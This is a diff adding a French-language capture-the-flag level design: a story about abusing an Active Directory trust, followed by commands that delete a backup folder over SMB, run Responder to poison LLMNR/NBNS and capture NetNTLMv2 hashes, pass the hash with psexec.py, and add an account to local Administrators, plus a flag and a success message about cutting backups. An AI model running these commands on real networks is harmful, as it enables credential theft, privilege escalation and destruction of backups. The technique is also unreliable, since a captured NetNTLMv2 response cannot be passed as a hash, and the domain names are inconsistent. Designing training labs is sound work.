@@ -274,10 +274,65 @@ Message réussite niveau :
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
-Level 4
+Level 4 (A ESSAYER ) : Attaque via le lien de confiance et empoisonnement SMB/LLMNR
+
+Script pour histoire du niveau :
+
+Grâce à votre compte SVC-bella sur le domaine bellagio.local, vous découvrez qu’un trust existe avec le domaine casino..com. Muni de vos privilèges, vous pouvez monter le partage \ITServer-Mirage\backups, utilisé pour les sauvegardes régulières.
+
+En explorant ce répertoire, vous tombez sur un fichier lastconn.txt, mis à jour chaque minute par un service de l’autre domaine pour y inscrire la date et l’heure de sa dernière connexion. Vous allez exploiter ce mécanisme pour forcer la machine distante à résoudre un nom de partage disparu, et ainsi capturer le hash NetNTLMv2 du compte qui tente de s’y reconnecter.
+
+Une fois en possession du hash, vous l’utiliserez en “pass-the-hash” pour prendre une session distante et vous garantir un accès administrateur dans le domaine Mirage, ouvrant la voie au sabotage complet des backups et à la mise hors ligne des systèmes de secours.
 
 
+Attaque : 
 
+Monter le partage SMB de l’autre AD
+
+smbclient \\\\ITServer-Mirage.casino.mirage.com\\backups \
+  -U ITAdmin-Bellagio
+
+  Forcer la requête de reconnection
+smb: \> rm -r backup_data
+
+Lancer le poison LLMNR/NBNS pour capturer le hash
+
+responder -I eth0 -wrf
+
+Extraire le hash capturé
+
+grep "SMB-NTLMv2" /usr/share/responder/logs/Responder-Session.log \
+  | awk '{print $NF}' > captured_hash.txt
+  
+
+  Pass-the-hash vers la machine ITServer-Mirage
+psexec.py -hashes :`cat captured_hash.txt` \
+  BackupUser-Mirage@ITServer-Mirage.casino.mirage.com
+
+  Ajouter votre compte pentester au groupe Administrators local
+
+net localgroup Administrators pentester /add
+
+
+Voici une idée de flag, basé sur le hash NetNTLMv2 capturé, sans faire appel au sAMAccountName :
+
+Flag (à soumettre) :
+
+FLAG{F1E2D3C4B5A6978877665544332211FF}
+Comment le récupérer :
+
+Après avoir lancé responder -I eth0 -wrf, le log /usr/share/responder/logs/Responder-Session.log contient une ligne de ce type :
+
+[SMB] NTLMv2-SSP Client   : BackupUser-Mirage
+      NTLMv2 Response     : F1E2D3C4B5A6978877665544332211FF:1122334455667788...
+      
+Flag ici F1E2D3C4B5A6978877665544332211FF
+
+Message réussite niveau :
+Vous êtes à présent Administrateur local du serveur de backups du domaine Mirage. La route est ouverte pour couper définitivement les sauvegardes...
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
 
